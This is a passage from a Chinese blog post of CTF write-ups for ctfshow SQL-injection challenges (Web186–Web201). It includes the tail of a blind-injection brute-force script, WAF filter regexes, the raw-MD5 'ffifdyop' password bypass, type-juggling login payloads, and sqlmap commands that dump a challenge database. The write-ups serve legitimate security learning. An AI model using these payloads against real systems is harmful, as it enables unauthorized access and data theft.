            if response.text.find(&quot;user_count = 1&quot;)&gt;0:  #如果接收到user_count = 1，就说明爆破正确，flag字符串拼接，然后爆下一个字符
                flag+=x
                if(x==&#39;&#125;&#39;):
                    exit()
                break
            else:
                print (x + &quot;wrong&quot;)
                continue
        print(flag)

def test():
    str = &quot;f%&quot;
    print(formatString(str))


if __name__ == &#39;__main__&#39;:
    # main()
    test()
</code></pre>
<h2 id="Web186："><a href="#Web186：" class="headerlink" title="Web186："></a>Web186：</h2><h3 id="1、题目-15"><a href="#1、题目-15" class="headerlink" title="1、题目"></a>1、题目</h3><p>查询语句</p>
<pre><code class="php">//拼接sql语句查找指定ID用户
  $sql = &quot;select count(*) from &quot;.$_POST[&#39;tableName&#39;].&quot;;&quot;;
      
</code></pre>
<p>返回逻辑</p>
<pre><code class="php">//对传入的参数进行了过滤
  function waf($str)&#123;
    return preg_match(&#39;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\`|sleep|benchmark/i&#39;, $str);
  &#125;

      
</code></pre>
<p>查询结果</p>
<pre><code class="php">//返回用户表的记录总数
      $user_count = 0;
      
</code></pre>
<h3 id="2、payload-13"><a href="#2、payload-13" class="headerlink" title="2、payload"></a>2、payload</h3><p>（1）多过滤掉了%号、大于小于号以及^号，但是相比较前面的脚本本身就没有涉及到这些，上一个脚本直接打就行</p>
<h2 id="Web187："><a href="#Web187：" class="headerlink" title="Web187："></a>Web187：</h2><h3 id="1、题目-16"><a href="#1、题目-16" class="headerlink" title="1、题目"></a>1、题目</h3><p>查询语句</p>
<pre><code class="php">//拼接sql语句查找指定ID用户
  $sql = &quot;select count(*) from ctfshow_user where username = &#39;$username&#39; and password= &#39;$password&#39;&quot;;
      
</code></pre>
<p>返回逻辑</p>
<pre><code class="php">    $username = $_POST[&#39;username&#39;];
    $password = md5($_POST[&#39;password&#39;],true);

    //只有admin可以获得flag
    if($username!=&#39;admin&#39;)&#123;
        $ret[&#39;msg&#39;]=&#39;用户名不存在&#39;;
        die(json_encode($ret));
    &#125;
</code></pre>
<p>用户登陆</p>
<blockquote>
<p>用户名：</p>
<p>密码：</p>
</blockquote>
<h3 id="2、payload-14"><a href="#2、payload-14" class="headerlink" title="2、payload"></a>2、payload</h3><p>（1）首先姓名只能是admin，而密码是通过MD5加密之后的，MD5的第二个参数是true，它会以十六字符长度的原始二进制格式返回，不了解，测试一下情况</p>
<pre><code class="php">&lt;?php
$content = &#39;qwerty&#39;;

$a = md5($content, false);
$b = md5($content, true);

var_dump($a);
var_dump($b);
</code></pre>
<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220716144032670.png" alt="image-20220716144032670"></p>
<p>（2）可以发现，参数为原始二进制格式返回的的结果是一串乱码，我也不知道它的实现流程。根据大佬的题解可以得到的是特殊的字符串<code>ffifdyop</code>，经过这样的加密之后可以得到结果如下</p>
<blockquote>
<p>‘or’6�]��!r,��b</p>
</blockquote>
<p>（3）此时我们再查看sql语句查询的内容：首先and的优先级高于or，前面进行与运算，密码为空就不会实现前面的内容就会执行后面or的语句，而or后面语句的结果就为1，为真，所以就会执行count的语句</p>
<pre><code class="sql">select count(*) from ctfshow_user where username = &#39;admin&#39; and password= &#39;&#39;or&#39;6�]��!r,��b&#39;
</code></pre>
<p>（4）根据如下的结果可以发现，字符串如此的or之后的结果类似与字符串转数字，有数字为1，不然为0</p>
<pre><code class="sql">mysql&gt; select &#39;aaaaa&#39;or&#39;6�]��!r,��b&#39; ;
+------------------------+
| &#39;aaaaa&#39;or&#39;6�]��!r,��b&#39; |
+------------------------+
|                      1 |
+------------------------+
1 row in set (0.03 sec)

mysql&gt; select &#39;aaaaa&#39;or&#39;1�]��!r,��b&#39;;
+------------------------+
| &#39;aaaaa&#39;or&#39;1�]��!r,��b&#39; |
+------------------------+
|                      1 |
+------------------------+
1 row in set (0.03 sec)

mysql&gt; select &#39;aaaaa&#39;or&#39;2�]��!r,��b&#39;;
+------------------------+
| &#39;aaaaa&#39;or&#39;2�]��!r,��b&#39; |
+------------------------+
|                      1 |
+------------------------+
1 row in set (0.03 sec)

mysql&gt; select &#39;aaaaa&#39;or&#39;0�]��!r,��b&#39;;
+------------------------+
| &#39;aaaaa&#39;or&#39;0�]��!r,��b&#39; |
+------------------------+
|                      0 |
+------------------------+
1 row in set (0.04 sec)

mysql&gt; select &#39;aaaaa&#39;or&#39;�]��!r,��b&#39;;
+-----------------------+
| &#39;aaaaa&#39;or&#39;�]��!r,��b&#39; |
+-----------------------+
|                     0 |
+-----------------------+
1 row in set (0.04 sec)
</code></pre>
<p>（5）抓包，回显给出flag</p>
<h2 id="Web188"><a href="#Web188" class="headerlink" title="Web188"></a>Web188</h2><h3 id="1、题目-17"><a href="#1、题目-17" class="headerlink" title="1、题目"></a>1、题目</h3><pre><code class="php">  //用户名检测
  if(preg_match(&#39;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#39;|\&quot;/i&#39;, $username))&#123;
    $ret[&#39;msg&#39;]=&#39;用户名非法&#39;;
    die(json_encode($ret));
  &#125;

  //密码检测
  if(!is_numeric($password))&#123;
    $ret[&#39;msg&#39;]=&#39;密码只能为数字&#39;;
    die(json_encode($ret));
  &#125;

  //密码判断
  if($row[&#39;pass&#39;]==intval($password))&#123;
      $ret[&#39;msg&#39;]=&#39;登陆成功&#39;;
      array_push($ret[&#39;data&#39;], array(&#39;flag&#39;=&gt;$flag));
    &#125;
</code></pre>
<h3 id="2、payload-15"><a href="#2、payload-15" class="headerlink" title="2、payload"></a>2、payload</h3><p>（1）首先要知道一个知识点，数字和字符串比较，字符串会强制转换成数字。所以只要我们查找的某一个账号的密码是以非数字开头的，而且这个账号我们知道，那么我就能通过输入密码0登陆成功</p>
<pre><code class="sql">mysql&gt; select passwd from user where username=0;
+-----------------------------+
| passwd                      |
+-----------------------------+
| 1234                        |
| 12345                       |
| 123456                      |
| flag&#123;this_is_flag_ha_ha_ha&#125; |
+-----------------------------+
4 rows in set (0.03 sec)
</code></pre>
<p>（2）所以本题的重点是获取到某账号的密码以字母开头，没有任何提示一个一个找肯定不可能，唯一能做的是查询多个账号，然后再从这些账号里面找寻密码。</p>
<p>（3）获取多个账号的方式可以利用如下的三种方式</p>
<p>① 当username&#x3D;0时，服务器就会查询所有以非数字开头的账号，然后返回该结果集</p>
<pre><code class="sql">username=0&amp;password=0
</code></pre>
<p>② 根据运算的优先级， 服务器首先会匹配到username是以1开头（或+、-），后面没有数字的所有账号；如果没有匹配到 结果为1， 就会返回所有的结果集</p>
<pre><code class="sql"> username= 1||1 &amp; password=0
</code></pre>
<p>③ 这种方式我不清楚它的运算逻辑，但是能知道的结果是： 返回除了username以1开头（或+、-），后面没有数字的所有的 账号</p>
<pre><code class="sql">username= 1&lt;1 &amp; password=0
</code></pre>
<h2 id="Web189："><a href="#Web189：" class="headerlink" title="Web189："></a>Web189：</h2><h1 id="Sqlmap："><a href="#Sqlmap：" class="headerlink" title="Sqlmap："></a>Sqlmap：</h1><h2 id="Web201"><a href="#Web201" class="headerlink" title="Web201"></a>Web201</h2><h3 id="1、题目-18"><a href="#1、题目-18" class="headerlink" title="1、题目"></a>1、题目</h3><blockquote>
<p> 使用–user-agent 指定agent</p>
<p> 使用–referer 绕过referer检查</p>
</blockquote>
<p>查询语句</p>
<pre><code class="php">//拼接sql语句查找指定ID用户
$sql = &quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;;&quot;;
      
</code></pre>
<p>返回逻辑</p>
<pre><code class="php">//对传入的参数进行了过滤
  function waf($str)&#123;
   //代码过于简单，不宜展示
  &#125;
     
</code></pre>
<h3 id="2、payload-16"><a href="#2、payload-16" class="headerlink" title="2、payload"></a>2、payload</h3><p>（1）查询服务器里所有的数据库</p>
<blockquote>
<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://0e16afff-54e3-4584-a938-d7681f291b6f.challenge.ctf.show:8080/api/?id=1&quot;">http://0e16afff-54e3-4584-a938-d7681f291b6f.challenge.ctf.show:8080/api/?id=1&quot;</a> –referer&#x3D;”ctf.show” –dbs –batch</p>
</blockquote>
<p>（2）查询ctfshow_web数据库里面的所有表</p>
<blockquote>
<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://0e16afff-54e3-4584-a938-d7681f291b6f.challenge.ctf.show:8080/api/?id=1&quot;">http://0e16afff-54e3-4584-a938-d7681f291b6f.challenge.ctf.show:8080/api/?id=1&quot;</a> –referer&#x3D;”ctf.show” -D ctfshow_web –tables</p>
</blockquote>
<p>（3）查询ctfshow_web数据库中ctfshow表中的所有的列</p>
<blockquote>
<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://0e16afff-54e3-4584-a938-d7681f291b6f.challenge.ctf.show:8080/api/?id=1&quot;">http://0e16afff-54e3-4584-a938-d7681f291b6f.challenge.ctf.show:8080/api/?id=1&quot;</a> –referer&#x3D;”ctf.show” -D ctfshow_web -T ctfshow_user –columns</p>
</blockquote>
<p>（4）查询ctfshow_web数据库中ctfshow_user表中的 id、username、pass三个字段，–dump表示在终端显示出来</p>
<blockquote>
<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://0e16afff-54e3-4584-a938-d7681f291b6f.challenge.ctf.show:8080/api/?id=1&quot;">http://0e16afff-54e3-4584-a938-d7681f291b6f.challenge.ctf.show:8080/api/?id=1&quot;</a> –referer&#x3D;”ctf.show” -D ctfshow_web -T ctfshow_user id,pass,username –dump</p>
</blockquote>

      
       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮箱至 1627319559@qq.com </span>
    </div>
</article>


<p>
    <a  class="dashang" onclick="dashangToggle()">赏</a>
</p>






    




    </div>
    <div class="copyright">
        <p class="footer-entry">
    ©2017 swedsn
</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
<a class="" id="rocket" ></a>

    </div>
</div>

<div class="hide_box" onclick="dashangToggle()"></div>
<div class="shang_box">
    <a class="shang_close"  onclick="dashangToggle()">×</a>
    <div class="shang_tit">
        <p>喜欢就点赞,疼爱就打赏</p>
    </div>
    <div class="shang_payimg">
        <div class="pay_img">
            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
        </div>
    </div>
    <div class="shang_payselect">
        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
    </div>
</div>


</body>
<script src="/js/jquery.pjax.js?v=1.1.0" ></script>

<script src="/js/script.js?v=1.1.0" ></script>
<script>
    var img_resize = 'default';
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $("#post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        
        $("input[name=pay]").on("click", function () {
            if($("input[name=pay]:checked").val()=="weixin"){
                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
            } else {
                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
            }
        })
        

        /*高亮代码块行号*/
        

        /*访问数量*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*打赏页面隐藏与展示*/
    
    function dashangToggle() {
        $(".shang_box").fadeToggle();
        $(".hide_box").fadeToggle();
    }
    

</script>

<!--加入行号的高亮代码块样式-->

<!--自定义样式设置-->
<style>
    
    
    .nav {
        width: 572px;
    }
    .nav.fullscreen {
        margin-left: -572px;
    }
    .nav-left {
        width: 150px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 512px;
        }
        .nav.fullscreen {
            margin-left: -512px;
        }
        .nav-left {
            width: 120px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 512px;
            margin-left: -512px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #FFE7BA;
    }
    
    

    /*列表样式*/
    

    /* 背景图样式 */
    
    


    /*引用块样式*/
    

    /*文章列表背景图*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.3;
        background: url("https://browser9.qhimg.com/bdm/1000_618_85/t0183def7a3a7924215.jpg");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    

    
</style>







</html>
